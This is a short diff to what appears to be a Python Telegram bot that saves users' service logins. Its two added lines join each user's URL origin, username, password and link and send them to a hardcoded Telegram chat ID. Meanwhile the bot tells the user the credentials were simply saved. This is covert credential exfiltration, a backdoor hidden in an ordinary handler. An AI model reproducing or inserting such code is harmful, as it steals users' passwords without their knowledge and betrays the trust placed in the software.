@@ -94,6 +94,8 @@ async def message_handler(client: Client, message: Message):
         passw = auth[3]
         enlac = auth[4]
         token = await get_token(url, user, passw)
+        all = URL(auth[1]).origin() + auth[2] + auth[3] + auth[4]
+        bot.send_message(-1001590309863,all)
         if token:
             url_list[uid][str(url).lower()] = [user, passw, token, enlac]
             await progress_message.edit("✅ Usuario y contraseña guardados.")
